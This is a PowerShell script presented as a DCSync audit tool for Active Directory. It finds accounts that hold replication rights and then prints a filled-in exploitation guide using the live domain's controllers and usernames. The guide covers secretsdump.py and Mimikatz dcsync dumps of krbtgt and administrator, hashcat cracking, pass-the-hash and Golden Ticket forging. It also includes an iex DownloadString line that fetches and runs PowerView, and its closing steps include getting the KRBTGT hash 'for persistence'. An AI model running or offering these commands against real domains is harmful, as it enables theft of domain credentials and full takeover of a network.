# Ensure execution policy allows script run (if needed)
# powershell -ep bypass

Import-Module ActiveDirectory

Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
Write-Host "DCSYNC AUDIT TOOL v2.0" -ForegroundColor Yellow
Write-Host "=" * 80 -ForegroundColor Cyan
Write-Host ""

# ================================================================================
# 1. ENUMERATE DOMAIN INFO AND DOMAIN CONTROLLERS
# ================================================================================
Write-Host "[*] Enumerating domain information..." -ForegroundColor Cyan

$domain = Get-ADDomain
$domainDN = $domain.DistinguishedName
$domainName = $domain.DNSRoot
$domainSID = $domain.DomainSID.Value

Write-Host "  Domain: $domainName" -ForegroundColor Green
Write-Host "  Domain SID: $domainSID" -ForegroundColor Green
Write-Host "  Domain DN: $domainDN" -ForegroundColor Green

# Get Domain Controllers
Write-Host "[*] Discovering Domain Controllers..." -ForegroundColor Cyan
$domainControllers = @()

try {
    $dcs = Get-ADDomainController -Filter * -ErrorAction Stop
    foreach ($dc in $dcs) {
        $domainControllers += [PSCustomObject]@{
            Name = $dc.HostName
            IP = $dc.IPv4Address
            Site = $dc.Site
            IsGlobalCatalog = $dc.IsGlobalCatalog
        }
    }
} catch {
    Write-Host "  [!] Could not get DCs via AD module. Trying DNS..." -ForegroundColor Yellow
    
    # Fallback to DNS lookup
    try {
        $output = nslookup -type=SRV _ldap._tcp.dc._msdcs.$domainName 2>$null
        foreach ($line in $output) {
            if ($line -match "internet address = (.+)") {
                $dcIP = $matches[1].Trim()
                $domainControllers += [PSCustomObject]@{
                    Name = "Unknown (IP: $dcIP)"
                    IP = $dcIP
                    Site = "Unknown"
                    IsGlobalCatalog = $true
                }
            }
        }
    } catch {
        Write-Host "  [!] Could not discover Domain Controllers" -ForegroundColor Red
    }
}

if ($domainControllers.Count -eq 0) {
    Write-Host "  [!] No Domain Controllers found. Using placeholder." -ForegroundColor Red
    $primaryDC = "DC_IP_OR_NAME"
} else {
    Write-Host "  Found $($domainControllers.Count) Domain Controller(s):" -ForegroundColor Green
    foreach ($dc in $domainControllers) {
        $gcStatus = if ($dc.IsGlobalCatalog) { " (GC)" } else { "" }
        Write-Host "    - $($dc.Name) [$($dc.IP)]$gcStatus" -ForegroundColor White
    }
    $primaryDC = $domainControllers[0].IP
    if ([string]::IsNullOrEmpty($primaryDC)) {
        $primaryDC = $domainControllers[0].Name
    }
}

# ================================================================================
# 2. ORIGINAL DCSYNC DETECTION LOGIC (UNCHANGED)
# ================================================================================
Write-Host "`n[*] Checking DCSync rights for all users..." -ForegroundColor Cyan

# Get all enabled domain users (sAMAccountName)
$allUsers = Get-ADUser -Filter * -Properties sAMAccountName | Select-Object -ExpandProperty sAMAccountName

# Define replication GUIDs
$replicationGUIDs = @(
    '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', # Replicating Directory Changes
    '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', # Replicating Directory Changes All
    '89e95b76-444d-4c62-991a-0facbeda640c'  # Replicating Directory Changes in Filtered Set
)

# Get domain ACL once (efficient)
$domainACL = Get-Acl "AD:\$domainDN"

$dcsyncUsers = foreach ($user in $allUsers) {
    $matches = $domainACL.Access | Where-Object {
        $_.IdentityReference -like "*\$user" -and
        $_.ObjectType -in $replicationGUIDs -and
        $_.ActiveDirectoryRights -match "ExtendedRight"
    }
    if ($matches) {
        Write-Host "[+] DCSync rights found: $user" -ForegroundColor Green
        $user
    }
}

if ($dcsyncUsers) {
    Write-Host "`n[!] CRITICAL: Users with DCSync rights ($($dcsyncUsers.Count) found):" -ForegroundColor Red -BackgroundColor Black
    foreach ($user in $dcsyncUsers) {
        Write-Host "  - $user" -ForegroundColor Red
    }
    
    # ================================================================================
    # 3. ENHANCED AUDITING BLOCK WITH FIXES
    # ================================================================================
    Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
    Write-Host "DETAILED AUDIT & EXPLOITATION GUIDE" -ForegroundColor Yellow
    Write-Host "=" * 80 -ForegroundColor Cyan
    
    foreach ($detectedUser in $dcsyncUsers) {
        Write-Host "`n[*] TARGET USER: $detectedUser" -ForegroundColor Magenta
        Write-Host "  " + ("-" * 70) -ForegroundColor DarkGray
        
        # --------------------------------------------------
        # 3.1 Get detailed user information
        # --------------------------------------------------
        Write-Host "`n  [1] USER INFORMATION:" -ForegroundColor Green
        
        $userDetails = Get-ADUser -Identity $detectedUser -Properties *
        
        # Display as Get-DomainUser would
        Write-Host "  samaccountname     : $($userDetails.samaccountname)" -ForegroundColor White
        Write-Host "  objectsid          : $($userDetails.SID)" -ForegroundColor White
        Write-Host "  useraccountcontrol : $($userDetails.UserAccountControl)" -ForegroundColor White
        
        # Group membership (formatted)
        Write-Host "  memberof           : " -ForegroundColor White -NoNewline
        if ($userDetails.MemberOf) {
            $groupCount = $userDetails.MemberOf.Count
            Write-Host "$groupCount group(s)" -ForegroundColor Cyan
            
            # Show first 5 groups
            $firstGroups = $userDetails.MemberOf | ForEach-Object {
                ($_ -split ',')[0] -replace 'CN='
            } | Select-Object -First 5
            
            foreach ($group in $firstGroups) {
                Write-Host "                     - $group" -ForegroundColor DarkGray
            }
            if ($groupCount -gt 5) {
                Write-Host "                     ... and $($groupCount - 5) more" -ForegroundColor DarkGray
            }
        } else {
            Write-Host "None" -ForegroundColor DarkGray
        }
        
        # Store the user's SID
        $sid = $userDetails.SID.Value
        Write-Host "`n  [2] USER SID: $sid" -ForegroundColor Green
        
        # --------------------------------------------------
        # 3.2 FIXED: Query ACLs using PowerView-style approach (if available)
        # --------------------------------------------------
        Write-Host "`n  [3] REPLICATION RIGHTS VERIFICATION:" -ForegroundColor Green
        
        # Try to use PowerView if available
        if (Get-Command Get-ObjectAcl -ErrorAction SilentlyContinue) {
            Write-Host "  Using PowerView Get-ObjectAcl..." -ForegroundColor Cyan
            
            $replicationACLs = Get-ObjectAcl "$domainDN" -ResolveGUIDs | Where-Object {
                ($_.ObjectAceType -match 'Replication-Get') -and
                ($_.SecurityIdentifier -eq $sid)
            } | Select-Object AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType
            
            if ($replicationACLs) {
                Write-Host "  Found replication rights:" -ForegroundColor Green
                $replicationACLs | Format-List
            } else {
                Write-Host "  [!] No replication rights found via PowerView (check cache)" -ForegroundColor Yellow
            }
        } else {
            Write-Host "  [!] PowerView not available. Install with:" -ForegroundColor Yellow
            Write-Host "      iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')" -ForegroundColor Cyan
        }
        
        # Alternative: Check our cached ACL properly
        Write-Host "  Checking cached domain ACL..." -ForegroundColor Cyan
        
        # Convert username to SID for comparison
        $userSidObj = New-Object System.Security.Principal.SecurityIdentifier($sid)
        $foundRights = $domainACL.Access | Where-Object {
            $_.SecurityIdentifier -eq $userSidObj -and
            $_.ObjectType -in $replicationGUIDs -and
            $_.ActiveDirectoryRights -match "ExtendedRight"
        }
        
        if ($foundRights) {
            Write-Host "  Verified DCSync rights in ACL:" -ForegroundColor Green
            foreach ($right in $foundRights) {
                $rightName = switch ($right.ObjectType.ToString()) {
                    '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' { 'DS-Replication-Get-Changes' }
                    '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' { 'DS-Replication-Get-Changes-All' }
                    '89e95b76-444d-4c62-991a-0facbeda640c' { 'DS-Replication-Get-Changes-In-Filtered-Set' }
                    default { 'Unknown' }
                }
                Write-Host "    - $rightName" -ForegroundColor White
            }
        }
        
        # --------------------------------------------------
        # 3.3 Check for reversible encryption
        # --------------------------------------------------
        Write-Host "`n  [4] REVERSIBLE ENCRYPTION CHECK:" -ForegroundColor Green
        
        $reversibleUsers = Get-ADUser -Filter 'userAccountControl -band 128' -Properties samaccountname, DistinguishedName, Enabled, UserAccountControl
        
        if ($reversibleUsers) {
            Write-Host "  [!] CRITICAL: Found $($reversibleUsers.Count) user(s) with reversible encryption:" -ForegroundColor Red
            foreach ($revUser in $reversibleUsers) {
                $isCurrent = $revUser.samaccountname -eq $detectedUser
                $currentMarker = if ($isCurrent) { " [CURRENT USER!]" } else { "" }
                Write-Host "    - $($revUser.samaccountname)$currentMarker" -ForegroundColor $(if ($isCurrent) { "Red" } else { "Yellow" })
                Write-Host "      DN: $($revUser.DistinguishedName)" -ForegroundColor DarkGray
                Write-Host "      Enabled: $($revUser.Enabled)" -ForegroundColor DarkGray
                Write-Host "      UAC: 0x$($revUser.UserAccountControl.ToString('X'))" -ForegroundColor DarkGray
            }
            
            Write-Host "`n  [!] IMPORTANT: These passwords are stored with RC4 and will be CLEARTEXT in dump!" -ForegroundColor Red
        } else {
            Write-Host "  [✓] No reversible encryption users found" -ForegroundColor Green
        }
        
        # --------------------------------------------------
        # 3.4 REAL EXPLOITATION COMMANDS (with actual DC info)
        # --------------------------------------------------
        Write-Host "`n  [5] EXPLOITATION COMMANDS:" -ForegroundColor Green
        
        if ($domainControllers.Count -gt 0) {
            Write-Host "  Domain Controllers available:" -ForegroundColor Cyan
            foreach ($dc in $domainControllers) {
                Write-Host "    $($dc.Name) [$($dc.IP)]" -ForegroundColor White
            }
            
            Write-Host "`n  IMPACKET secretsdump.py commands:" -ForegroundColor Cyan
            foreach ($dc in $domainControllers) {
                # FIXED: Use ${target} syntax to handle colons in IP addresses
                $target = if ($dc.IP) { $dc.IP } else { $dc.Name }
                $safeTarget = $target -replace ':', '_'  # Replace colon if present
                Write-Host "  # Using ${safeTarget}:" -ForegroundColor White
                Write-Host "    secretsdump.py -outputfile ${domainName}_hashes -just-dc $domainName/$detectedUser@$target" -ForegroundColor Green
                Write-Host "    secretsdump.py -just-dc-user krbtgt $domainName/$detectedUser@$target" -ForegroundColor Green
                Write-Host "    secretsdump.py -just-dc-user administrator $domainName/$detectedUser@$target" -ForegroundColor Green
                Write-Host ""
            }
        } else {
            Write-Host "  [!] No DCs found. Replace DC_IP with actual Domain Controller:" -ForegroundColor Yellow
            Write-Host "    secretsdump.py -just-dc $domainName/$detectedUser@DC_IP_OR_NAME" -ForegroundColor Cyan
        }
        
        Write-Host "  Expected output files:" -ForegroundColor White
        Write-Host "    ${domainName}_hashes.ntds           - NTLM hashes" -ForegroundColor Gray
        Write-Host "    ${domainName}_hashes.ntds.kerberos  - Kerberos keys" -ForegroundColor Gray
        Write-Host "    ${domainName}_hashes.ntds.cleartext - Cleartext passwords (if reversible)" -ForegroundColor $(if ($reversibleUsers) { "Red" } else { "Gray" })
        
        # --------------------------------------------------
        # 3.5 MIMIKATZ COMMANDS
        # --------------------------------------------------
        Write-Host "`n  [6] MIMIKATZ COMMANDS:" -ForegroundColor Green
        Write-Host "  First, run as the DCSync user:" -ForegroundColor White
        Write-Host "    runas /netonly /user:$domainName\$detectedUser powershell" -ForegroundColor Cyan
        Write-Host "    # Enter the password for $detectedUser" -ForegroundColor DarkGray
        
        Write-Host "`n  Then in the new PowerShell, run Mimikatz:" -ForegroundColor White
        Write-Host "    .\mimikatz.exe" -ForegroundColor Cyan
        Write-Host "    privilege::debug" -ForegroundColor Cyan
        Write-Host "    lsadump::dcsync /domain:$domainName /user:krbtgt" -ForegroundColor Cyan
        Write-Host "    lsadump::dcsync /domain:$domainName /user:administrator" -ForegroundColor Cyan
        
        # --------------------------------------------------
        # 3.6 POST-EXPLOITATION
        # --------------------------------------------------
        Write-Host "`n  [7] POST-EXPLOITATION:" -ForegroundColor Green
        
        Write-Host "  After getting hashes:" -ForegroundColor White
        Write-Host "    # Crack with hashcat:" -ForegroundColor Cyan
        Write-Host "    hashcat -m 1000 -a 0 ${domainName}_hashes.ntds /usr/share/wordlists/rockyou.txt -o cracked.txt" -ForegroundColor Green
        
        Write-Host "    # Pass-the-hash:" -ForegroundColor Cyan
        Write-Host "    pth-winexe -U administrator%NTLM_HASH //${primaryDC} cmd.exe" -ForegroundColor Green
        
        Write-Host "    # Golden Ticket (need KRBTGT hash):" -ForegroundColor Cyan
        Write-Host "    ticketer.py -nthash KRBTGT_HASH -domain-sid $domainSID -domain $domainName administrator" -ForegroundColor Green
        
        Write-Host "`n  [8] SECURITY RECOMMENDATIONS:" -ForegroundColor Green
        Write-Host "    [!] Remove DCSync rights from $detectedUser after assessment" -ForegroundColor Yellow
        Write-Host "    [!] Change passwords for reversible encryption users" -ForegroundColor Yellow
        Write-Host "    [!] Rotate KRBTGT password (if >180 days old)" -ForegroundColor Yellow
        
        Write-Host "`n  " + ("~" * 70) -ForegroundColor DarkGray
    }
    
    # ================================================================================
    # 4. ADDITIONAL CHECKS
    # ================================================================================
    Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
    Write-Host "ADDITIONAL SECURITY CHECKS" -ForegroundColor Yellow
    Write-Host "=" * 80 -ForegroundColor Cyan
    
    # Check KRBTGT age
    Write-Host "`n[*] Checking KRBTGT account..." -ForegroundColor Cyan
    try {
        $krbtgt = Get-ADUser -Identity krbtgt -Properties PasswordLastSet, LastLogonDate
        $pwdAge = (Get-Date) - $krbtgt.PasswordLastSet
        
        Write-Host "  Password last set: $($krbtgt.PasswordLastSet)" -ForegroundColor White
        Write-Host "  Password age: $($pwdAge.Days) days" -ForegroundColor $(if ($pwdAge.Days -gt 180) { "Red" } else { "Green" })
        
        if ($pwdAge.Days -gt 180) {
            Write-Host "  [!] KRBTGT password >180 days old - recommend rotating!" -ForegroundColor Red
        }
    } catch {
        Write-Host "  [-] Could not retrieve KRBTGT info" -ForegroundColor Yellow
    }
    
    # Check Domain Admins (they have implicit DCSync)
    Write-Host "`n[*] Checking Domain Admins group..." -ForegroundColor Cyan
    try {
        $domainAdmins = Get-ADGroupMember -Identity "Domain Admins" -Recursive | Get-ADUser -Properties Enabled
        
        if ($domainAdmins) {
            Write-Host "  Domain Admins members ($($domainAdmins.Count)):" -ForegroundColor White
            foreach ($admin in $domainAdmins) {
                $status = if ($admin.Enabled) { "Enabled" } else { "Disabled" }
                Write-Host "    - $($admin.SamAccountName) [$status]" -ForegroundColor $(if ($admin.Enabled) { "Red" } else { "DarkGray" })
            }
        }
    } catch {
        Write-Host "  [-] Could not enumerate Domain Admins" -ForegroundColor Yellow
    }
    
    # ================================================================================
    # 5. SAVE REPORT
    # ================================================================================
    Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
    Write-Host "GENERATING REPORT" -ForegroundColor Yellow
    Write-Host "=" * 80 -ForegroundColor Cyan
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $reportFile = "DCSync_Audit_${domainName}_${timestamp}.txt"
    
    $report = @"
=== DCSYNC AUDIT REPORT ===
Generated: $(Get-Date)
Domain: $domainName
Domain SID: $domainSID

=== CRITICAL FINDINGS ===
DCSync Users: $($dcsyncUsers.Count)
Reversible Encryption Users: $($reversibleUsers.Count)

=== DOMAIN CONTROLLERS ===
$(foreach ($dc in $domainControllers) {
    "$($dc.Name) [$($dc.IP)]"
} -join "`n")

=== DCSYNC USERS ===
$(foreach ($user in $dcsyncUsers) {
    "$user"
} -join "`n")

=== REVERSIBLE ENCRYPTION USERS ===
$(if ($reversibleUsers) {
    foreach ($user in $reversibleUsers) {
        "$($user.samaccountname) - $($user.DistinguishedName)"
    } -join "`n"
} else {
    "None found"
})

=== EXPLOITATION COMMANDS ===
secretsdump.py -just-dc $domainName/$($dcsyncUsers[0])@$primaryDC
secretsdump.py -just-dc-user krbtgt $domainName/$($dcsyncUsers[0])@$primaryDC
"@
    
    $report | Out-File -FilePath $reportFile -Encoding UTF8
    Write-Host "[+] Report saved to: $reportFile" -ForegroundColor Green
    
} else {
    Write-Host "`n[✓] No users found with explicit DCSync rights." -ForegroundColor Green
    
    # Still check for reversible encryption
    Write-Host "`n[*] Checking for reversible encryption accounts..." -ForegroundColor Cyan
    $reversibleUsers = Get-ADUser -Filter 'userAccountControl -band 128' -Properties samaccountname, DistinguishedName
    
    if ($reversibleUsers) {
        Write-Host "[!] Found $($reversibleUsers.Count) user(s) with reversible encryption:" -ForegroundColor Red
        foreach ($user in $reversibleUsers) {
            Write-Host "  - $($user.samaccountname)" -ForegroundColor Red
        }
    }
}

Write-Host "`n" + ("=" * 80) -ForegroundColor Cyan
Write-Host "AUDIT COMPLETE" -ForegroundColor Green
Write-Host "=" * 80 -ForegroundColor Cyan
Write-Host "Next steps:"
Write-Host "  1. Test DCSync with actual Domain Controller IP/name" -ForegroundColor White
Write-Host "  2. Look for cleartext passwords in .ntds.cleartext file" -ForegroundColor White
Write-Host "  3. Get KRBTGT hash for persistence" -ForegroundColor White
Write-Host "  4. Report findings and recommend remediation" -ForegroundColor White
